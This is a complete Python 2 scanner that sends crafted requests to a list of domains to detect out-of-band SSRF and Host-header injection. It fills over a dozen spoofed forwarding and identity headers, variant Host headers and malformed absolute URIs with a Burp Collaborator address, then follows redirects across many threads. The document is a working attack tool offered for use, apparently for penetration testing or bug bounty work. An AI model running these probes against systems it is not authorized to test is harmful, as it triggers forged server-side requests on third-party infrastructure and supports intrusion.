import urllib
import optparse
import httplib
import os
import threadpool

count = 0
validhttpcount = 0
validhttpscount = 0

def getparamsfromredirection(url, schema):
    urlprotocol,s1 = urllib.splittype(url)
    urlhost,s2 = urllib.splithost(s1)
    urlhost,urlport = urllib.splitport(urlhost)
    if urlprotocol == None:
        urlprotocol = schema
    return (urlprotocol, urlhost, urlport)

def fire(domain, schema, port, timeout, method, url, body, headers):
    conn = ''
    response = None
    try:
        time = 5
        while(response == None or response.status in (301,302,303,304,305,306,307,308,309,310)):
            if (response != None and response.status in (301,302,303,304,305,306,307,308,309,310)):
                try:
                    (schema, domain, port) = getparamsfromredirection(response.getheader("Location"), schema)

                    if 'burpcollaborator.net' in domain.lower():
                        raise Exception

                except Exception,e:
                    print e.message
                    print '[!] The domain returns a nonstardard redirection location header or return a origin host header, mayby NOT Vulnerable !'
                    raise Exception
            if schema.lower() == 'http':
                conn = httplib.HTTPConnection(domain, port=port, timeout=timeout)
            elif schema.lower() == 'https':
                conn = httplib.HTTPSConnection(domain, port=port, timeout=timeout)
            else:
                print '[!] Unsupported schema, supported schema is HTTP and HTTPS!'
                exit(0)

            if method.lower() == 'get':
                conn.request(method.upper(), url, headers=headers)
            elif method.lower() == 'post':
                conn.request(method.upper(), url, urllib.urlencode(body), headers)
            else:
                print '[!] Unsupported method, supported method is GET and POST!'
                exit(0)

            response = conn.getresponse()
            time = time - 1
            if time < 0:
                raise Exception
        return response
    except Exception, e:
        print e.message
        return False
    finally:
        conn.close()


def loadHeadersAndLaunch(domainName, collaboratorServerAddress, schema, port, timeout=10, verbose=False):
    user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@ua.%s.%s' % (domainName, collaboratorServerAddress)
    forwarded = 'for=spoofed.forwarded.%s.%s;by=spoofed.forwarded.%s.%s;host=spoofed.forwarded.%s.%s' % (domainName, collaboratorServerAddress,domainName, collaboratorServerAddress,domainName, collaboratorServerAddress)
    x_forwarded_for = 'spoofed.xforwardedfor.%s.%s' % (domainName, collaboratorServerAddress)
    contact = 'root@contact.%s.%s' % (domainName, collaboratorServerAddress)
    from1 = 'root@from.%s.%s' % (domainName, collaboratorServerAddress)
    x_wap_profile = 'http://xwapprofile.%s.%s' % (domainName, collaboratorServerAddress)
    x_originating_ip = 'spoofed.xoriginatingip.%s.%s' % (domainName, collaboratorServerAddress)
    client_ip = 'spoofed.clientip.%s.%s' % (domainName, collaboratorServerAddress)
    x_client_ip = 'spoofed.xclientip.%s.%s' % (domainName, collaboratorServerAddress)
    x_real_ip = 'spoofed.xrealip.%s.%s' % (domainName, collaboratorServerAddress)
    true_client_ip = 'spoofed.trueclientip.%s.%s' % (domainName, collaboratorServerAddress)
    referer = 'http://headername.%s.%s' % (domainName, collaboratorServerAddress)
    x_forwarded_host = 'xforwardedhost.%s.%s' % (domainName, collaboratorServerAddress)
    urls = 'postbody.%s.%s' % (domainName, collaboratorServerAddress)

    body = {'name': 'x-burp-collaboratorserver', 'url': urls}
    headers = {'User-Agent': user_agent, 'Connection': 'close', 'Cache-Control': 'no-transform','Forwarded': forwarded,
               'X-Forwarded-For': x_forwarded_for, 'Contact': contact,'From': from1, 'X-Wap-Profile': x_wap_profile,
               'X-Originating-IP': x_originating_ip,'Client-IP': client_ip, 'X-Client-IP': x_client_ip,'X-Real-IP': x_real_ip,
               'True-Client-IP': true_client_ip, 'Referer': referer,'X-Forwarded-Host': x_forwarded_host,'Progma': 'no-cache',
               'Cache-control': 'no-cache, no-transform'}

    print '[!] GET method firing at %s with multi http headers ' % domainName
    res = fire(domainName, schema, port, timeout, "GET", "/", {}, headers)
    if type(res) == bool:
        if verbose:
            print '[-] %s method using %s launch failed!' % ("GET", schema.upper())
        pass
    else:
        if verbose:
            print '[+] %s method using %s launch successed, response code is %s ' % ("GET", schema.upper(), res.status)
        pass

    print '[!] POST method firing at %s with multi http headers ' % domainName
    res = fire(domainName, schema, port, timeout, "POST", "/", body, headers)
    if type(res) == bool:
        if verbose:
            print '[-] %s method using %s launch failed!' % ("POST", schema.upper())
        pass
    else:
        if verbose:
            print '[+] %s method using %s launch successed, response code is %s ' % ("POST", schema.upper(), res.status)
        pass


def modifyHostAndLaunch(domainName, collaboratorServerAddress, schema, port, timeout=10, verbose=False):
    hosts = []
    hosts.append("host1." + domainName + "." + collaboratorServerAddress)
    hosts.append(domainName + "@" + "host2." + domainName + "." + collaboratorServerAddress)
    hosts.append(domainName + ":@" + "host3." + domainName + "." + collaboratorServerAddress)
    hosts.append(domainName + ":80@" "host4." + domainName + "." + collaboratorServerAddress)
    hosts.append(domainName + ":443@" "host5." + domainName + "." + collaboratorServerAddress)

    headers = []
    for host in hosts:
        headers.append({'Host': host, 'Progma': 'no-cache', 'Cache-control': 'no-cache, no-transform', 'Connection': 'close'})

    print '[!] Firing at %s with modified host header ' % domainName
    conn = ''

    for header in headers:
        res = fire(domainName, schema, port, timeout, "GET", "/", {}, header)
        if type(res) == bool:
            if verbose:
                print '[-] Launch "Host: ' + str(header) + '" using %s failed' % schema
            pass
        else:
            if verbose:
                print '[+] Launch "Host: ' + str(header) + '" using %s successed, response code is %s' % (schema, res.status)
            pass


def malformedUriAndLaunch(domainName, collaboratorServerAddress, schema, port, timeout=10, verbose=False):
    headers = {'Progma': 'no-cache', 'Cache-control': 'no-cache, no-transform', 'Connection': 'close', 'Host': domainName}
    urls = []
    urls.append("@mailformedUri1.%s.%s" % (domainName,collaboratorServerAddress))
    urls.append(":@mailformedUri2.%s.%s" % (domainName,collaboratorServerAddress))
    urls.append("%s://mailformedUri3.%s.%s" % (schema.lower(), domainName, collaboratorServerAddress))
    urls.append("%s://%s@mailformedUri4.%s.%s" % (schema.lower(), domainName,domainName,collaboratorServerAddress))
    urls.append("%s://%s:@mailformedUri5.%s.%s" % (schema.lower(), domainName, domainName,collaboratorServerAddress))

    print '[!] Firing at %s with Host overridding usring %s' % (domainName, schema)
    for url in urls:
        res = fire(domainName, schema, port, timeout, "GET", url, {}, headers)
        if type(res) == bool:
            if verbose:
                print '[-] Launch malformed uri : %s using %s failed' % (url, schema)
            pass
        else:
            if verbose:
                print '[+] Launch malformed uri : %s using %s successed, response code is %s' % (url, schema, res.status)
            pass

def isvalidhttpdomain(domain,port=80,timeout=10):
    try:
        conn = httplib.HTTPConnection(domain, port, timeout=timeout)
        conn.request("GET","/")
        res = conn.getresponse()
        if res.status == 200 and 'activity/dnserror' in res.read():
            return False
        else:
            return True
    except Exception,e:
        print e.message
        return False


def isvalidhttpsdomain(domain, port=443, timeout=10):
    try:
        conn = httplib.HTTPSConnection(domain, port, timeout=timeout)
        conn.request("GET","/")
        res = conn.getresponse()
        if res.status == 200 and 'activity/dnserror' in res.read():
            return False
        else:
            return True
    except Exception,e:
        print e.message
        return False

def armAndLaunch(domainName, collaboratorServerAddress, port, timeout=10, verbose=False):
    if port == None:
        if isvalidhttpdomain(domainName, 80, timeout):
            loadHeadersAndLaunch(domainName, collaboratorServerAddress, 'http', 80, timeout, verbose)
            modifyHostAndLaunch(domainName, collaboratorServerAddress, 'http', 80, timeout, verbose)
            malformedUriAndLaunch(domainName, collaboratorServerAddress, 'http', 80, timeout, verbose)
            global validhttpcount
            validhttpcount += 1
    else:
        if isvalidhttpdomain(domainName, port, timeout):
            loadHeadersAndLaunch(domainName, collaboratorServerAddress, 'http', port, timeout, verbose)
            modifyHostAndLaunch(domainName, collaboratorServerAddress, 'http', port, timeout, verbose)
            malformedUriAndLaunch(domainName, collaboratorServerAddress, 'http', port, timeout, verbose)
            global validhttpcount
            validhttpcount += 1


    if port == None:
        if isvalidhttpsdomain(domainName, 443, timeout):
            loadHeadersAndLaunch(domainName, collaboratorServerAddress, 'https', 443, timeout, verbose)
            modifyHostAndLaunch(domainName, collaboratorServerAddress, 'https', 443, timeout, verbose)
            malformedUriAndLaunch(domainName, collaboratorServerAddress, 'https', 443, timeout, verbose)
            global validhttpscount
            validhttpscount += 1
    else:
        if isvalidhttpsdomain(domainName, port, timeout):
            loadHeadersAndLaunch(domainName, collaboratorServerAddress, 'https', port, timeout, verbose)
            modifyHostAndLaunch(domainName, collaboratorServerAddress, 'https', port, timeout, verbose)
            malformedUriAndLaunch(domainName, collaboratorServerAddress, 'https', port, timeout, verbose)
            global validhttpscount
            validhttpscount += 1

    global count
    count += 1


def main():
    parser = optparse.OptionParser("usage: %prog [-h] [-d domain] [-f file] -c collboratorserver [-t threads] [-v verbose] [--timeout] -[p port]")
    parser.add_option('-d', '--domain', dest='domain', type='string', help='Domain name to test')
    parser.add_option('-f', '--file', dest='file', type='string', help='File contains domain names')
    parser.add_option('-c', '--collaborator', dest='collaborator', type='string', help='Collaborator server address')
    parser.add_option('-t', '--threads', dest='threads', type='int', help='specify threads to run')
    parser.add_option('--timeout', dest='timeout', type='int', help='specify timeout for HTTP/HTTPS connection, default is 10')
    parser.add_option('-p', '--port', dest='port', type='int', help='specify a port for HTTP/HTTPS connection, default is 80(HTTP) and 443(HTTPS)')
    parser.add_option('-v', '--verbose', dest='verbose', action='store_true', help='show verbose messages')
    (option, args) = parser.parse_args()

    domain = option.domain
    file = option.file
    coll = option.collaborator
    threads = option.threads
    timeout = option.timeout
    port = option.port

    if coll == None:
        print parser.usage
        exit(0)

    if domain == None and file == None:
        print 'File and Domain must specify at least one'
        exit(0)

    targets = []
    if domain != None:
        domains = domain.split(",")
        for do in domains:
            targets.append(do)

    if file != None:
        if os.path.exists(file):
            pass
        else:
            print '[-] File not exist, existing...'
            exit(0)

        for line in open(file):
            targets.append(line.strip())

    flag = False
    if option.verbose != None:
        flag = True

    if timeout == None:
        timeout = 10

    if threads == None:
        for target in targets:
            armAndLaunch(target, coll, port, timeout=timeout, verbose=flag)

    else:
        pool = threadpool.ThreadPool(threads)
        args = []
        for target in targets:
            temp = []
            temp.append(target)
            temp.append(coll)
            temp.append(port)
            temp.append(timeout)
            temp.append(flag)
            args.append((temp, None))
        requests = threadpool.makeRequests(armAndLaunch, args)
        [pool.putRequest(req) for req in requests]
        pool.wait()

if __name__ == '__main__':
    main()
    print '[+] Script done, scaned ' + str(count) + ' domains !'
    print '[+] Valid http domain is ' + str(validhttpcount)
    print '[+] Valid https domain is ' + str(validhttpscount)